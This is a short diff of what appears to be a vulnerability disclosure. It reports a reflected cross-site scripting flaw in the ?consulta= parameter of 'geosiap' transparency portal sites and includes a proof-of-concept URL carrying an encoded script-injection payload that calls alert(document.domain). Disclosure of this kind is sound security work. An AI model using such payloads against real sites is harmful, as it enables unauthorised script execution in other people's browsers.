@@ -1,3 +1,3 @@
-I found an XSS error in the ?query= parameter on several websites of the geosiap system on the transparency portal.
+The parameter via get with xss vulnerability ?consulta= was found on several sites of the geosiap system on the transparency portal.
 
 https://teste.teste.net.br/xxxx/websis/portal_transparencia/financeiro/contas_publicas/?consulta=asd%22%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
